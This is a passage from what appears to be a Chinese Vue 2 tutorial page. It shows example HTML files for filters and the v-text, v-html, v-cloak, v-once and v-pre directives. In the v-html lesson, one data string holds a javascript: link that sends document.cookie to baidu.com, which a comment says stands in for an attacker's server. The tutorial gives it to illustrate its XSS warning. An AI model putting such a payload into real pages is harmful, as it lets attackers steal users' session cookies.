class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>过滤器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/dayjs.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        过滤器：</span></span><br><span class="line"><span class="comment">            定义：对要显示的数据进行一些特定格式处理后在显示（适用于一些简单逻辑处理）。</span></span><br><span class="line"><span class="comment">            语法：</span></span><br><span class="line"><span class="comment">                1.注册过滤器： Vue.filter(name，callback) 或 new Vue(&#123;filters:&#123;&#125;&#125;)</span></span><br><span class="line"><span class="comment">                2.使用过滤器：&#123;&#123;xxx | 过滤器名&#125;&#125; 或 v-bind:属性=&quot;xxx | 过滤器名&quot;</span></span><br><span class="line"><span class="comment">            备注：</span></span><br><span class="line"><span class="comment">                1.过滤器也可以接收额外参数，多个过滤器也可以串联</span></span><br><span class="line"><span class="comment">                2.并没有改变原本的数据，只产生新的对应的数据</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>格式化后的时间：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 计算属性实现 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;showTime&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- methods实现 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;showTime01()&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 过滤器实现 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;time | showTime02&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 过滤器实现(传参) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;time | showTime02(&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;)&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 过滤器实现(多个过滤器串联) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>现在的时间：&#123;&#123;time | showTime02(&#x27;YYYY年MM月DD日 HH:mm:ss&#x27;) | mySlice&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 过滤器实现(多个过滤器串联) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">:x</span>=<span class="string">&quot;msg | mySlice&quot;</span>&gt;</span>电信学院<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//全局过滤器</span></span></span><br><span class="line"><span class="javascript">    Vue.filter(<span class="string">&#x27;mySlice&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> val.slice(<span class="number">0</span>,<span class="number">4</span>)</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            time:1629796662740,</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好电信学院&#x27;</span></span></span><br><span class="line">        &#125;, </span><br><span class="line">        computed:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showTime</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(<span class="built_in">this</span>.time).format(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showTime01</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(<span class="built_in">this</span>.time).format(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,    </span><br><span class="line">        filters:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showTime02</span>(<span class="params">val,str=<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;@&#x27;</span>,val)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> dayjs(val).format(str)</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="comment">//局部过滤器</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// mySlice(val)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     return val.slice(0,4)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// &#125;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="33-内置指令-v-text"><a href="#33-内置指令-v-text" class="headerlink" title="33.内置指令(v-text)"></a>33.内置指令(v-text)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-text)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        已经学过的指令：</span></span><br><span class="line"><span class="comment">            v-bind:单向数据绑定解析表达式，可简写为“:xxx”</span></span><br><span class="line"><span class="comment">            v-model:双向数据绑定</span></span><br><span class="line"><span class="comment">            v-on:绑定事件监听，可简写为“@xx”</span></span><br><span class="line"><span class="comment">            v-for:遍历数组、对象、字符串</span></span><br><span class="line"><span class="comment">            v-if:条件渲染（动态控制节点是否存在）</span></span><br><span class="line"><span class="comment">            v-else-if:条件渲染（动态控制节点是否存在）</span></span><br><span class="line"><span class="comment">            v-else:条件渲染（动态控制节点是否存在）</span></span><br><span class="line"><span class="comment">            v-show:条件渲染（动态控制节点是否展示）</span></span><br><span class="line"><span class="comment">        v-text指令：</span></span><br><span class="line"><span class="comment">            1.作用：向其所在的节点渲染文本内容。</span></span><br><span class="line"><span class="comment">            2.与插值语法的区别：v-text会替换掉节点中的内容，&#123;&#123;xxx&#125;&#125;则不会。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-text</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line"><span class="handlebars"><span class="xml">            str:&#x27;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="34-内置指令-v-html"><a href="#34-内置指令-v-html" class="headerlink" title="34.内置指令(v-html)"></a>34.内置指令(v-html)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-html)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        v-html指令：</span></span><br><span class="line"><span class="comment">            1.作用：向其所在的节点渲染包含HTML结构的内容。</span></span><br><span class="line"><span class="comment">            2.与插值语法的区别：</span></span><br><span class="line"><span class="comment">                (1).v-html会替换掉节点中所有的内容，&#123;&#123;xxx&#125;&#125;则不会。</span></span><br><span class="line"><span class="comment">                (2).v-html可以识别HTML结构。</span></span><br><span class="line"><span class="comment">            3.严重注意，HTML有安全性问题：</span></span><br><span class="line"><span class="comment">                (1).在网站上动态渲染任意HTML是非常危险的，容易导致xss攻击。</span></span><br><span class="line"><span class="comment">                (2).一定要在可信的内容上使用v-html，永远不要再用户提交的内容上。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">&quot;str2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="handlebars"><span class="xml">            str:&#x27;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&#x27;,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//危险代码片段，获取网页cookie并发送到百度网站（百度网站模拟坏人的服务器）</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            str2:&#x27;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:location.href</span>=<span class="string">&quot;http://www.baidu.com?&quot;</span>+<span class="attr">document.cookie</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="35-内置指令-v-cloak"><a href="#35-内置指令-v-cloak" class="headerlink" title="35.内置指令(v-cloak)"></a>35.内置指令(v-cloak)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-cloak)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-attr">[v-cloak]</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        v-cloak指令(没有值)：</span></span><br><span class="line"><span class="comment">            1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</span></span><br><span class="line"><span class="comment">            2.使用CSS配合v-cloak可以解决网速慢时页面展示出&#123;&#123;xxx&#125;&#125;的问题。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-cloak</span>&gt;</span>&#123;&#123;str&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            str:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="36-内置指令-v-once"><a href="#36-内置指令-v-once" class="headerlink" title="36.内置指令(v-once)"></a>36.内置指令(v-once)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-once)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        v-once指令：</span></span><br><span class="line"><span class="comment">            1.v-once所在节点在初次动态渲染后，就视为静态内容了。</span></span><br><span class="line"><span class="comment">            2.以后数据改变不会引起v-once所在结构的数据更新，可以用于优化性能。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-once</span>&gt;</span>初始化的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            n:5,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="37-内置指令-v-pre"><a href="#37-内置指令-v-pre" class="headerlink" title="37.内置指令(v-pre)"></a>37.内置指令(v-pre)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内置指令(v-pre)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        v-pre指令：</span></span><br><span class="line"><span class="comment">            1. v-pre可以跳过其所在节点的编译过程。</span></span><br><span class="line"><span class="comment">            2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-pre</span>&gt;</span>Vue其实很简单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            n:5,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="38-自定义指令"><a href="#38-自定义指令" class="headerlink" title="38.自定义指令"></a>38.自定义指令</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>自定义指令<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span 